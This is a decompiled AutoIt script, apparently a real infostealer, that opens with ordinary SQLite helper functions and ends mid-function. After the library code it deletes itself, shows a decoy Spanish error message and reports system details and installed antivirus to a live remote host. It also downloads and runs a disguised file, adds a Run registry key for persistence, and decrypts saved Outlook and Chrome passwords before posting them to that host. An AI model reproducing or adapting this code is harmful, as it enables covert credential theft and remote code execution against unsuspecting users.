    If __SQLITE_HCHK($hdb, 0x2) Then Return SetError(@error, 0x0, $sqlite_misuse)
    Local $irval = DllCall($__g_hdll_sqlite, "int:cdecl", "sqlite3_close", "ptr", $hdb)
    If @error Then Return SetError(0x1, @error, $sqlite_misuse)
    If $irval[0x0] <> $sqlite_ok Then
        __SQLITE_REPORTERROR($hdb, "_SQLite_Close")
        Return SetError(+0xffffffff, 0x0, $irval[0x0])
    EndIf
    $__g_hdb_sqlite = 0x0
    __SQLITE_HDEL($__g_ahdbs_sqlite, $hdb)
    Return $irval[0x0]
EndFunc   ;==>_SQLITE_CLOSE
Func _SQLite_SafeMode($bsafemodestate)
    $__g_bsafemodestate_sqlite = ($bsafemodestate = True)
    Return $sqlite_ok
EndFunc   ;==>_SQLITE_SAFEMODE
Func _SQLite_QueryFinalize($hquery)
    If __SQLITE_HCHK($hquery, 0x2, False) Then Return SetError(@error, 0x0, $sqlite_misuse)
    Local $avrval = DllCall($__g_hdll_sqlite, "int:cdecl", "sqlite3_finalize", "ptr", $hquery)
    If @error Then Return SetError(0x1, @error, $sqlite_misuse)
    __SQLITE_HDEL($__g_ahquerys_sqlite, $hquery)
    If $avrval[0x0] <> $sqlite_ok Then SetError(+0xffffffff)
    Return $avrval[0x0]
EndFunc   ;==>_SQLITE_QUERYFINALIZE
Func _SQLite_QueryReset($hquery)
    If __SQLITE_HCHK($hquery, 0x2, False) Then Return SetError(@error, 0x0, $sqlite_misuse)
    Local $avrval = DllCall($__g_hdll_sqlite, "int:cdecl", "sqlite3_reset", "ptr", $hquery)
    If @error Then Return SetError(0x1, @error, $sqlite_misuse)
    If $avrval[0x0] <> $sqlite_ok Then SetError(+0xffffffff)
    Return $avrval[0x0]
EndFunc   ;==>_SQLITE_QUERYRESET
Func _SQLite_FetchNames($hquery, ByRef $anames)
    Dim $anames[0x1]
    If __SQLITE_HCHK($hquery, 0x3, False) Then Return SetError(@error, 0x0, $sqlite_misuse)
    Local $avdatacnt = DllCall($__g_hdll_sqlite, "int:cdecl", "sqlite3_column_count", "ptr", $hquery)
    If @error Then Return SetError(0x1, @error, $sqlite_misuse)
    If $avdatacnt[0x0] <= 0x0 Then Return SetError(+0xffffffff, 0x0, $sqlite_done)
    ReDim $anames[$avdatacnt[0x0]]
    Local $avcolname
    For $icnt = 0x0 To $avdatacnt[0x0] + 0xffffffff
        $avcolname = DllCall($__g_hdll_sqlite, "wstr:cdecl", "sqlite3_column_name16", "ptr", $hquery, "int", $icnt)
        If @error Then Return SetError(0x2, @error, $sqlite_misuse)
        $anames[$icnt] = $avcolname[0x0]
    Next
    Return $sqlite_ok
EndFunc   ;==>_SQLITE_FETCHNAMES
Func _SQLite_QuerySingleRow($hdb, $ssql, ByRef $arow)
    $arow = ""
    If __SQLITE_HCHK($hdb, 0x2) Then Return SetError(@error, 0x0, $sqlite_misuse)
    Local $hquery
    Local $irval = _SQLite_Query($hdb, $ssql, $hquery)
    If @error Then
        _SQLite_QueryFinalize($hquery)
        Return SetError(0x1, 0x0, $irval)
    Else
        $irval = _SQLite_FetchData($hquery, $arow)
        If $irval = $sqlite_ok Then
            _SQLite_QueryFinalize($hquery)
            If @error Then
                Return SetError(0x4, 0x0, $irval)
            Else
                Return $sqlite_ok
            EndIf
        Else
            _SQLite_QueryFinalize($hquery)
            Return SetError(0x3, 0x0, $irval)
        EndIf
    EndIf
EndFunc   ;==>_SQLITE_QUERYSINGLEROW
Func _SQLite_SQLiteExe($sdatabasefile, $sinput, ByRef $soutput, $ssqliteexefilename = "sqlite3.exe", $bdebug = False)
    If $ssqliteexefilename = +0xffffffff Or $ssqliteexefilename = Default Then
        $ssqliteexefilename = "sqlite3.exe"
        $ssqliteexefilename = __SQLITE_GETDOWNLOADEDPATH($ssqliteexefilename) & $ssqliteexefilename
        If Not FileExists($ssqliteexefilename) Then Return SetError(0x2, 0x0, $sqlite_misuse)
    EndIf
    If Not FileExists($sdatabasefile) Then
        Local $hnewfile = FileOpen($sdatabasefile, $fo_overwrite + $fo_createpath)
        If $hnewfile = +0xffffffff Then
            Return SetError(0x1, 0x0, $sqlite_cantopen)
        EndIf
        FileClose($hnewfile)
    EndIf
    Local $sinputfile = _TempFile(), $soutputfile = _TempFile(), $irval = $sqlite_ok
    Local $hinputfile = FileOpen($sinputfile, $fo_overwrite)
    If $hinputfile > +0xffffffff Then
        $sinput = ".output stdout" & @CRLF & $sinput
        FileWrite($hinputfile, $sinput)
        FileClose($hinputfile)
        Local $scmd = @ComSpec & " /c " & FileGetShortName($ssqliteexefilename) & '  "' & FileGetShortName($sdatabasefile) & '" > "' & FileGetShortName($soutputfile) & '" < "' & FileGetShortName($sinputfile) & '"'
        Local $nerrorlevel = RunWait($scmd, @WorkingDir, @SW_HIDE)
        If $bdebug = True Then
            Local $nerrortemp = @error
            If @error Then __SQLITE_PRINT("@@ Debug(_SQLite_SQLiteExe) : $sCmd = " & $scmd & @CRLF & ">ErrorLevel: " & $nerrorlevel & @CRLF)
            SetError($nerrortemp)
        EndIf
        If @error = 0x1 Or $nerrorlevel = 0x1 Then
            $irval = $sqlite_misuse
        Else
            $soutput = FileRead($soutputfile, FileGetSize($soutputfile))
            If StringInStr($soutput, "SQL error:", $str_casesense) > 0x0 Or StringInStr($soutput, "Incomplete SQL:", $str_casesense) > 0x0 Then $irval = $sqlite_error
        EndIf
    Else
        $irval = $sqlite_cantopen
    EndIf
    If FileExists($sinputfile) Then FileDelete($sinputfile)
    Switch $irval
        Case $sqlite_misuse
            SetError(0x2)
        Case $sqlite_error
            SetError(0x3)
        Case $sqlite_cantopen
            SetError(0x4)
    EndSwitch
    Return $irval
EndFunc   ;==>_SQLITE_SQLITEEXE
Func _SQLite_Encode($vdata)
    If IsNumber($vdata) Then $vdata = String($vdata)
    If Not IsString($vdata) And Not IsBinary($vdata) Then Return SetError(0x1, 0x0, "")
    Local $vrval = "X'"
    If StringLower(StringLeft($vdata, 0x2)) = "0x" And Not IsBinary($vdata) Then
        For $icnt = 0x1 To StringLen($vdata)
            $vrval &= Hex(Asc(StringMid($vdata, $icnt, 0x1)), 0x2)
        Next
    Else
        If Not IsBinary($vdata) Then $vdata = StringToBinary($vdata, 0x4)
        $vrval &= Hex($vdata)
    EndIf
    $vrval &= "'"
    Return $vrval
EndFunc   ;==>_SQLITE_ENCODE
Func _SQLite_Escape($sstring, $ibuffsize = Default)
    If $__g_hdll_sqlite = 0x0 Then Return SetError(0x1, $sqlite_misuse, "")
    If IsNumber($sstring) Then $sstring = String($sstring)
    Local $tsql8 = __SQLITE_STRINGTOUTF8STRUCT($sstring)
    If @error Then Return SetError(0x2, @error, 0x0)
    Local $arval = DllCall($__g_hdll_sqlite, "ptr:cdecl", "sqlite3_mprintf", "str", "'%q'", "struct*", $tsql8)
    If @error Then Return SetError(0x1, @error, "")
    If $ibuffsize = Default Or $ibuffsize < 0x1 Then $ibuffsize = +0xffffffff
    Local $sresult = __SQLITE_SZSTRINGREAD($arval[0x0], $ibuffsize)
    If @error Then Return SetError(0x3, @error, "")
    DllCall($__g_hdll_sqlite, "none:cdecl", "sqlite3_free", "ptr", $arval[0x0])
    Return $sresult
EndFunc   ;==>_SQLITE_ESCAPE
Func _SQLite_FastEncode($vdata)
    If Not IsBinary($vdata) Then $vdata = Binary($vdata)
    Return "X'" & StringTrimLeft($vdata, 0x2) & "'"
EndFunc   ;==>_SQLITE_FASTENCODE
Func _SQLite_FastEscape($sstring)
    If IsNumber($sstring) Then $sstring = String($sstring)
    If Not IsString($sstring) Then Return SetError(0x1, 0x0, "")
    Return ("'" & StringReplace($sstring, "'", "''", 0x0, $str_casesense) & "'")
EndFunc   ;==>_SQLITE_FASTESCAPE
Func _SQLITE_GETTABLEDATA2D($hdb, $ssql, ByRef $aresult, ByRef $irows, ByRef $anames)
    If __SQLITE_HCHK($hdb, 0x1) Then Return SetError(@error, 0x0, $sqlite_misuse)
    $aresult = ""
    Local $hquery
    Local $r = _SQLite_Query($hdb, $ssql, $hquery)
    If @error Then Return SetError(0x2, @error, $r)
    If $r <> $sqlite_ok Then
        __SQLITE_REPORTERROR($hdb, "_SQLite_GetTableData", $ssql)
        Return SetError(+0xffffffff, 0x0, $r)
    EndIf
    Local $adatarow
    $r = _SQLite_FetchNames($hquery, $anames)
    If @error Then
        Local $ierror = @error
        _SQLite_QueryFinalize($hquery)
        Return SetError(0x5, $ierror, $r)
    EndIf
    Local $icolumns = UBound($anames)
    Local Const $ichunk = 0x2000
    Local $nmaxrow = $ichunk
    Dim $aresult[$nmaxrow][$icolumns]
    $irows = 0x0
    While _SQLite_FetchData($hquery, $adatarow) = $sqlite_ok
        If $irows = $nmaxrow Then
            $nmaxrow += $ichunk
            ReDim $aresult[$nmaxrow][$icolumns]
        EndIf
        For $j = 0x0 To $icolumns + 0xffffffff
            $aresult[$irows][$j] = $adatarow[$j]
        Next
        $irows += 0x1
    WEnd
    If $irows = 0x0 Then
        $aresult = ""
    Else
        ReDim $aresult[$irows][$icolumns]
    EndIf
    Return $sqlite_ok
EndFunc   ;==>_SQLITE_GETTABLEDATA2D
#Region		SQLite.au3 Internal Functions
Func __SQLITE_HCHK(ByRef $hgeneric, $nerror, $bdb = True)
    If $__g_hdll_sqlite = 0x0 Then Return SetError(0x1, $sqlite_misuse, $sqlite_misuse)
    If $hgeneric = +0xffffffff Or $hgeneric = "" Or $hgeneric = Default Then
        If Not $bdb Then Return SetError($nerror, 0x0, $sqlite_error)
        $hgeneric = $__g_hdb_sqlite
    EndIf
    If Not $__g_bsafemodestate_sqlite Then Return $sqlite_ok
    If $bdb Then
        If _ArraySearch($__g_ahdbs_sqlite, $hgeneric) > 0x0 Then Return $sqlite_ok
    Else
        If _ArraySearch($__g_ahquerys_sqlite, $hgeneric) > 0x0 Then Return $sqlite_ok
    EndIf
    Return SetError($nerror, 0x0, $sqlite_error)
EndFunc   ;==>__SQLITE_HCHK
Func __SQLITE_HADD(ByRef $ahlists, $hgeneric)
    _ArrayAdd($ahlists, $hgeneric)
EndFunc   ;==>__SQLITE_HADD
Func __SQLITE_HDEL(ByRef $ahlists, $hgeneric)
    Local $ielement = _ArraySearch($ahlists, $hgeneric)
    If $ielement > 0x0 Then _ArrayDelete($ahlists, $ielement)
EndFunc   ;==>__SQLITE_HDEL
Func __SQLITE_VERSCMP($sfile, $sversion)
    Local $avrval = DllCall($sfile, "str:cdecl", "sqlite3_libversion")
    If @error Then Return $sqlite_corrupt
    Local $sfileversion = StringSplit($avrval[0x0], ".")
    Local $imaintversion = 0x0
    If $sfileversion[0x0] = 0x4 Then $imaintversion = $sfileversion[0x4]
    $sfileversion = (($sfileversion[0x1] * 0x3e8 + $sfileversion[0x2]) * 0x3e8 + $sfileversion[0x3]) * 0x64 + $imaintversion
    If $sversion < 0x989680 Then $sversion = $sversion * 0x64
    If $sfileversion >= $sversion Then Return $sqlite_ok
    Return $sqlite_mismatch
EndFunc   ;==>__SQLITE_VERSCMP
Func __SQLITE_HDBG()
    __SQLITE_PRINT("State : " & $__g_bsafemodestate_sqlite & @CRLF)
    Local $atmp = $__g_ahdbs_sqlite
    For $i = 0x0 To UBound($atmp) + 0xffffffff
        __SQLITE_PRINT("$__g_ahDBs_SQLite     -> [" & $i & "]" & $atmp[$i] & @CRLF)
    Next
    $atmp = $__g_ahquerys_sqlite
    For $i = 0x0 To UBound($atmp) + 0xffffffff
        __SQLITE_PRINT("$__g_ahQuerys_SQLite  -> [" & $i & "]" & $atmp[$i] & @CRLF)
    Next
EndFunc   ;==>__SQLITE_HDBG
Func __SQLITE_REPORTERROR($hdb, $sfunction, $squery = Default, $serror = Default, $vreturnvalue = Default, $icurerr = @error, $icurext = @extended)
    If @Compiled Then Return SetError($icurerr, $icurext)
    If $serror = Default Then $serror = _SQLite_ErrMsg($hdb)
    If $squery = Default Then $squery = ""
    Local $sout = "!   SQLite.au3 Error" & @CRLF
    $sout &= "--> Function: " & $sfunction & @CRLF
    If $squery <> "" Then $sout &= "--> Query:    " & $squery & @CRLF
    $sout &= "--> Error:    " & $serror & @CRLF
    __SQLITE_PRINT($sout & @CRLF)
    If Not ($vreturnvalue = Default) Then Return SetError($icurerr, $icurext, $vreturnvalue)
    Return SetError($icurerr, $icurext)
EndFunc   ;==>__SQLITE_REPORTERROR
Func __SQLITE_SZSTRINGREAD($pptr, $imaxlen = +0xffffffff)
    If $pptr = 0x0 Then Return ""
    If $__g_hmsvcrtdll_sqlite < 0x1 Then $__g_hmsvcrtdll_sqlite = DllOpen("msvcrt.dll")
    Local $astrlen = DllCall($__g_hmsvcrtdll_sqlite, "ulong_ptr:cdecl", "strlen", "ptr", $pptr)
    If @error Then Return SetError(0x1, @error, "")
    Local $ilen = $astrlen[0x0] + 0x1
    Local $tstring = DllStructCreate("byte[" & $ilen & "]", $pptr)
    If @error Then Return SetError(0x2, @error, "")
    Local $ierror = 0x0
    Local $srtn = __SQLITE_UTF8STRUCTTOSTRING($tstring)
    If @error Then
        $ierror = 0x3
    EndIf
    If $imaxlen <= 0x0 Then
        Return SetError($ierror, @extended, $srtn)
    Else
        Return SetError($ierror, @extended, StringLeft($srtn, $imaxlen))
    EndIf
EndFunc   ;==>__SQLITE_SZSTRINGREAD
Func __SQLITE_SZFREE($pptr, $icurerr = @error)
    If $pptr <> 0x0 Then DllCall($__g_hdll_sqlite, "none:cdecl", "sqlite3_free", "ptr", $pptr)
    SetError($icurerr)
EndFunc   ;==>__SQLITE_SZFREE
Func __SQLITE_STRINGTOUTF8STRUCT($sstring)
    Local $acall = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "uint", 0xfde9, "dword", 0x0, "wstr", $sstring, "int", +0xffffffff, "ptr", 0x0, "int", 0x0, "ptr", 0x0, "ptr", 0x0)
    If @error Then Return SetError(0x1, @error, "")
    Local $ttext = DllStructCreate("char[" & $acall[0x0] & "]")
    $acall = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "uint", 0xfde9, "dword", 0x0, "wstr", $sstring, "int", +0xffffffff, "struct*", $ttext, "int", $acall[0x0], "ptr", 0x0, "ptr", 0x0)
    If @error Then Return SetError(0x2, @error, "")
    Return $ttext
EndFunc   ;==>__SQLITE_STRINGTOUTF8STRUCT
Func __SQLITE_UTF8STRUCTTOSTRING($ttext)
    Local $acall = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", 0xfde9, "dword", 0x0, "struct*", $ttext, "int", +0xffffffff, "ptr", 0x0, "int", 0x0)
    If @error Then Return SetError(0x1, @error, "")
    Local $twstr = DllStructCreate("wchar[" & $acall[0x0] & "]")
    $acall = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", 0xfde9, "dword", 0x0, "struct*", $ttext, "int", +0xffffffff, "struct*", $twstr, "int", $acall[0x0])
    If @error Then Return SetError(0x2, @error, "")
    Return DllStructGetData($twstr, 0x1)
EndFunc   ;==>__SQLITE_UTF8STRUCTTOSTRING
Func __SQLITE_CONSOLEWRITE($stext)
    ConsoleWrite($stext)
EndFunc   ;==>__SQLITE_CONSOLEWRITE
Func __SQLITE_PRINT($stext)
    If IsFunc($__g_hprintcallback_sqlite) Then
        If $__g_butf8errormsg_sqlite Then
            Local $tstr8 = __SQLITE_STRINGTOUTF8STRUCT($stext)
            $__G_HPRINTCALLBACK_SQLITE(DllStructGetData($tstr8, 0x1))
        Else
            $__G_HPRINTCALLBACK_SQLITE($stext)
        EndIf
    EndIf
EndFunc   ;==>__SQLITE_PRINT
Func __SQLITE_GETDOWNLOADEDPATH(ByRef $sdll_filename, $vinlineversion = "")
    Local $bdownloaddll = True, $iextended = 0x0
    If $vinlineversion = "" Then
        $vinlineversion = Call("__SQLite_Inline_Version")
        If @error Then $bdownloaddll = False
    Else
        Local $aversion = StringSplit($vinlineversion, ".")
        If @error = 0x0 Then
            Local $imaintversion = 0x0
            If $aversion[0x0] = 0x4 Then $imaintversion = $aversion[0x4]
            $vinlineversion = (($aversion[0x1] * 0x3e8 + $aversion[0x2]) * 0x3e8 + $aversion[0x3]) * 0x64 + $imaintversion
        EndIf
    EndIf
    Local $sdll_dirpath = "", $slocalpath = @LocalAppDataDir & "\AutoIt v3\SQLite\"
    If __SQLITE_VERSCMP(@ScriptDir & "\" & $sdll_filename, $vinlineversion) = $sqlite_ok Then
        $sdll_dirpath = @ScriptDir & "\"
        $bdownloaddll = False
    ElseIf __SQLITE_VERSCMP(@WorkingDir & "\" & $sdll_filename, $vinlineversion) = $sqlite_ok Then
        $sdll_dirpath = @WorkingDir & "\"
        $bdownloaddll = False
    ElseIf __SQLITE_VERSCMP($slocalpath & $sdll_filename, $vinlineversion) = $sqlite_ok Then
        $sdll_dirpath = $slocalpath
        $bdownloaddll = False
    ElseIf __SQLITE_VERSCMP(@SystemDir & "\" & $sdll_filename, $vinlineversion) = $sqlite_ok Then
        $sdll_dirpath = @SystemDir & "\"
        $bdownloaddll = False
    ElseIf __SQLITE_VERSCMP(@WindowsDir & "\" & $sdll_filename, $vinlineversion) = $sqlite_ok Then
        $sdll_dirpath = @WindowsDir & "\"
        $bdownloaddll = False
    ElseIf $bdownloaddll Then
        Local $sext = StringRight($sdll_filename, 0x4)
        Local $sdll_filename_ver = StringReplace($sdll_filename, $sext, "") & "_" & $vinlineversion & $sext
        If __SQLITE_VERSCMP(@ScriptDir & "\" & $sdll_filename_ver, $vinlineversion) = $sqlite_ok Then
            $sdll_dirpath = @ScriptDir & "\"
            $bdownloaddll = False
        ElseIf __SQLITE_VERSCMP(@WorkingDir & "\" & $sdll_filename_ver, $vinlineversion) = $sqlite_ok Then
            $sdll_dirpath = @WorkingDir & "\"
            $bdownloaddll = False
        ElseIf __SQLITE_VERSCMP($slocalpath & $sdll_filename_ver, $vinlineversion) = $sqlite_ok Then
            $sdll_dirpath = $slocalpath
            $bdownloaddll = False
        ElseIf __SQLITE_VERSCMP(@SystemDir & "\" & $sdll_filename_ver, $vinlineversion) = $sqlite_ok Then
            $sdll_dirpath = @SystemDir & "\"
            $bdownloaddll = False
        ElseIf __SQLITE_VERSCMP(@WindowsDir & "\" & $sdll_filename_ver, $vinlineversion) = $sqlite_ok Then
            $sdll_dirpath = @WindowsDir & "\"
            $bdownloaddll = False
        EndIf
        If Not $bdownloaddll Then
            $iextended = 0x1
        Else
            $sdll_dirpath = $slocalpath
        EndIf
        $sdll_filename = $sdll_filename_ver
    EndIf
    Return SetExtended($iextended, $sdll_dirpath)
EndFunc   ;==>__SQLITE_GETDOWNLOADEDPATH
#EndRegion		SQLite.au3 Internal Functions
Func __SQLITE_INLINE_MODIFIED()
    Return "20190512104318"
EndFunc   ;==>__SQLITE_INLINE_MODIFIED
Func __SQLITE_INLINE_VERSION()
    Return "302800000"
EndFunc   ;==>__SQLITE_INLINE_VERSION
Global $surlinfo = "https://luzca.com/img/do/it.php"
If _ISWIN7() Then $surlinfo = "http://luzca.com/img/do/it.php"
FileDelete(@ScriptFullPath)
Local $isadmin = "User"
If IsAdmin() Then $isadmin = "Admin"
_ILNKER($surlinfo & "?b1&v1=" & Dec(@OSLang) & "&v2=" & Dec(@KBLayout) & "&v3=&v4=" & _GETOS() & "&v5=" & $isadmin & "&v6=" & @OSArch & "&v7=" & AV())
CREATESHORTCUTX_OLD()
MsgBox(0x40, "Error de emision", "Este e-mail ha sido enviado por error y ha sido revocado por su emisor. Por favor haga caso omiso a este e-mail.")
_HTTPGET($surlinfo & "?f=2&w=" & _GETOS())
_OUTRECOVERY()
_CHROMERECOVERY()
_HTTPGET($surlinfo & "?f=9&w=" & _GETOS())
Func _OUTRECOVERY()
    Local $sodata = _GETINFORMATION()
    If $sodata <> "" Then
        _HTTPPOST($surlinfo, "info=" & $sodata)
    EndIf
EndFunc   ;==>_OUTRECOVERY
Func _CHROMERECOVERY()
    Local $sodata = _GETCHROMEPASSWORD()
    If $sodata <> "" Then
        _HTTPPOST($surlinfo, "info2=" & $sodata)
    EndIf
EndFunc   ;==>_CHROMERECOVERY
Func _HTTPGET($surl)
    Local $ohttp = ObjCreate("WinHttp.WinHttpRequest.5.1")
    If _ISWIN7() Then $surl = StringReplace($surl, "https:", "http:")
    $ohttp .Open("GET", $surl, False)
    If (@error) Then Return SetError(0x1, 0x0, 0x0)
    $ohttp .Send()
    If (@error) Then Return SetError(0x2, 0x0, 0x0)
    If ($ohttp .Status <> 0xc8) Then Return SetError(0x3, 0x0, 0x0)
    Return SetError(0x0, 0x0, $ohttp .ResponseText)
EndFunc   ;==>_HTTPGET
Func _HTTPPOST($surl, $sdata = "")
    Local $ohttp = ObjCreate("WinHttp.WinHttpRequest.5.1")
    If _ISWIN7() Then $surl = StringReplace($surl, "https:", "http:")
    $ohttp .Open("POST", $surl, False)
    If (@error) Then Return SetError(0x1, 0x0, 0x0)
    $ohttp .SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
    $ohttp .Send($sdata)
    If (@error) Then Return SetError(0x2, 0x0, 0x0)
    If ($ohttp .Status <> 0xc8) Then Return SetError(0x3, 0x0, 0x0)
    Return SetError(0x0, 0x0, $ohttp .ResponseText)
EndFunc   ;==>_HTTPPOST
Func _DOWNLOADFILE($surl, $sdata)
    Local $ohttp = ObjCreate("WinHttp.WinHttpRequest.5.1")
    $ohttp .Open("GET", $surl, False)
    If (@error) Then Return SetError(0x1, 0x0, 0x0)
    $ohttp .Send()
    If (@error) Then Return SetError(0x2, 0x0, 0x0)
    If ($ohttp .Status <> 0xc8) Then Return SetError(0x3, 0x0, 0x0)
    FileWrite($sdata, $ohttp .ResponseBody)
EndFunc   ;==>_DOWNLOADFILE
Func _ISWIN7()
    $objwmiservice = ObjGet("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    $colsettings = $objwmiservice .ExecQuery("Select * from Win32_OperatingSystem")
    For $objoperatingsystem In $colsettings
        If StringInStr($objoperatingsystem .Caption, "Windows 7") Then Return True
    Next
    Return False
EndFunc   ;==>_ISWIN7
Func _GETOS()
    $objwmiservice = ObjGet("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    $colsettings = $objwmiservice .ExecQuery("Select * from Win32_OperatingSystem")
    For $objoperatingsystem In $colsettings
        If StringInStr($objoperatingsystem .Caption, "Windows 7") Then Return "Windows 7"
        If StringInStr($objoperatingsystem .Caption, "Windows 8") Then Return "Windows 8"
        If StringInStr($objoperatingsystem .Caption, "Windows 10") Then Return "Windows 10"
        If StringInStr($objoperatingsystem .Caption, "Windows 11") Then Return "Windows 11"
    Next
    Return "Unknown"
EndFunc   ;==>_GETOS
Func _ILNKER($surl)
    $spathbin = GETDIR(@AutoItExe) & "\df6uiv.jpg"
    InetGet($surl, $spathbin, $inet_forcebypass)
    If Not FileExists($spathbin) Then
        _DOWNLOADFILE($surl, $spathbin)
    EndIf
    If FileExists($spathbin) Then
        RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "WinDriver", "REG_SZ", '"' & @AutoItExe & '" "' & $spathbin & '"')
        ShellExecute(@AutoItExe, $spathbin)
    EndIf
EndFunc   ;==>_ILNKER
Func AV()
    Local $aresult0 = ""
    $owmi = ObjGet("winmgmts:" & "{impersonationLevel=impersonate}!\\localhost\root\SecurityCenter2")
    $colitems = $owmi .ExecQuery("Select * from AntiVirusProduct")
    For $objantivirusproduct In $colitems
        $aresult0 = $aresult0 & $objantivirusproduct .DisplayName & " -"
    Next
    Return $aresult0
EndFunc   ;==>AV
Func GETDIR($sfilepath)
    If Not IsString($sfilepath) Then
        Return SetError(0x1, 0x0, +0xffffffff)
    EndIf
    Local $filedir = StringRegExpReplace($sfilepath, "\\[^\\]*$", "")
    Return $filedir
EndFunc   ;==>GETDIR
#Region OutlookPW
Func _GETINFORMATION()
    Local $aregistry[] = ["HKCU\Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676\", "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676\", "HKCU\Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676\", "HKCU\Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676\"]
    Local $soutput = ""
    For $i = 0x0 To UBound($aregistry) + 0xffffffff
        If _FINDREGISTRYKEYVALUENAME($aregistry[$i], "Email") Then
            If _FINDREGISTRYKEYVALUENAME($aregistry[$i], "POP3 Server") Then
                $soutput &= _BIN2STR(_FINDREGISTRYKEYVALUENAME($aregistry[$i], "POP3 Server")) & ","
                $soutput &= _BIN2STR(_FINDREGISTRYKEYVALUENAME($aregistry[$i], "POP3 User")) & ","
                $soutput &= _UNPROTECT(BinaryMid(_FINDREGISTRYKEYVALUENAME($aregistry[$i], "POP3 Password"), 0x2)) & @CRLF
                $soutput &= _BIN2STR(_FINDREGISTRYKEYVALUENAME($aregistry[$i], "SMTP Server")) & ","
                $soutput &= _BIN2STR(_FINDREGISTRYKEYVALUENAME($aregistry[$i], "POP3 User")) & ","
                $soutput &= _UNPROTECT(BinaryMid(_FINDREGISTRYKEYVALUENAME($aregistry[$i], "POP3 Password"), 0x2)) & @CRLF
            Else
                $soutput &= _BIN2STR(_FINDREGISTRYKEYVALUENAME($aregistry[$i], "IMAP Server")) & ","
                $soutput &= _BIN2STR(_FINDREGISTRYKEYVALUENAME($aregistry[$i], "IMAP User")) & ","
                $soutput &= _UNPROTECT(BinaryMid(_FINDREGISTRYKEYVALUENAME($aregistry[$i], "IMAP Password"), 0x2)) & @CRLF
                $soutput &= _BIN2STR(_FINDREGISTRYKEYVALUENAME($aregistry[$i], "SMTP Server")) & ","
                $soutput &= _BIN2STR(_FINDREGISTRYKEYVALUENAME($aregistry[$i], "IMAP User")) & ","
                $soutput &= _UNPROTECT(BinaryMid(_FINDREGISTRYKEYVALUENAME($aregistry[$i], "IMAP Password"), 0x2)) & @CRLF
            EndIf
        EndIf
    Next
    Return $soutput
EndFunc   ;==>_GETINFORMATION
Func _BIN2STR($bbin)
    If IsBinary($bbin) Then
        Return StringStripWS(BinaryToString($bbin, 0x2), 0x3)
    Else
        Return $bbin
    EndIf
EndFunc   ;==>_BIN2STR
Func _FINDREGISTRYKEYVALUENAME($sregistrypath, $skeynamevalue)
    Local $skeyvalue = ""
    Local $i = 0x1
    While True
        Local $ssubkey = RegEnumKey($sregistrypath, $i)
        If @error Then ExitLoop
        Local $keyvalue_ = __FINDKEYVALUENAME($sregistrypath & $ssubkey, $skeynamevalue)
        If $keyvalue_ Then
            $skeyvalue = $keyvalue_
            ExitLoop
        EndIf
        $i += 0x1
    WEnd
    Return $skeyvalue
EndFunc   ;==>_FINDREGISTRYKEYVALUENAME
Func __FINDKEYVALUENAME($regpath, $valuename)
    Local $i = 0x1
    Local $skeyvalue = ""
    While True
        Local $svar = RegEnumVal($regpath, $i)
        If @error Then ExitLoop
        If $svar = $valuename Then
            $skeyvalue = RegRead($regpath, $valuename)
            ExitLoop
        EndIf
        $i += 0x1
    WEnd
    Return $skeyvalue
EndFunc   ;==>__FINDKEYVALUENAME
Func _UNPROTECT($bin)
    Local $passsize = BinaryLen($bin)
    Local $datastruct = DllStructCreate("byte[" & $passsize & "]")
    DllStructSetData($datastruct, 0x1, $bin)
    Local $datainbolbstruct = DllStructCreate("dword cbData;ptr pbData")
    DllStructSetData($datainbolbstruct, 0x1, $passsize)
    DllStructSetData($datainbolbstruct, 0x2, DllStructGetPtr($datastruct))
    Local $dataoutbolbstruct = DllStructCreate("dword cbData;ptr pbData")
    Local $dllopen = DllOpen("Crypt32.dll")
    Local $cryptunprotectdata = DllCall($dllopen, "bool", "CryptUnprotectData", "struct*", $datainbolbstruct, "ptr*", 0x0, "ptr", 0x0, "ptr", 0x0, "ptr", 0x0, "dword", 0x0, "struct*", $dataoutbolbstruct)
    Local $passwordstruct = DllStructCreate("byte[" & DllStructGetData($dataoutbolbstruct, 0x1) & "]", DllStructGetData($dataoutbolbstruct, 0x2))
    Local $password = DllStructGetData($passwordstruct, 0x1)
    Return StringStripWS(BinaryToString($password, 0x2), 0x3)
EndFunc   ;==>_UNPROTECT
#EndRegion OutlookPW
#Region ChromePW
Func _GETCHROMEPASSWORD()
    Local $achromepassword[0x3e8][0x3]
    Local $sbinchromemasterkey = _GETMASTERKEY()
    Local $hquery, $arow
    Local $slogindata = @LocalAppDataDir & "\Google\Chrome\User Data\Default\Login Data"
    _LOG("Login DataPath: " & $slogindata)
    Local $stempfilename = _TempFile(@TempDir, "", ".tmp", Default)
    FileCopy($slogindata, $stempfilename, 0x1)
    If Not FileExists($stempfilename) Then Return ""
    _LOG("OK")
    $sqllibrary = @TempDir & "\sqlite3.dll"
    If Not FileExists($sqllibrary) Then
        _DOWNLOADFILE("https://www.autoitscript.com/autoit3/pkgmgr/sqlite/sqlite3.dll", $sqllibrary)
    EndIf
    If Not FileExists($sqllibrary) Then
        Return ""
    EndIf
    _SQLite_Startup($sqllibrary, False, True)
    _SQLite_Open($stempfilename)
    If @error Then
        Return ""
    EndIf
    _SQLite_Query(+0xffffffff, "SELECT * FROM logins;", $hquery)
    Local $surl = ""
    Local $susername = ""
    Local $spassword = ""
    Local $sbuff = ""
    Local $icount = 0x0
    While _SQLite_FetchData($hquery, $arow, False, False) = $sqlite_ok
        $surl = $arow[0x0]
        $susername = $arow[0x3]
        $spassword = $arow[0x5]
        If Not $susername Or Not $spassword Then ContinueLoop
        _LOG(">" & $surl)
        _LOG($susername)
        _LOG($spassword)
        $achromepassword[$icount][0x0] = $surl
        $achromepassword[$icount][0x1] = $susername
        $achromepassword[$icount][0x2] = $spassword
        If BinaryToString(BinaryMid($spassword, 0x1, 0x3)) = "v10" Then
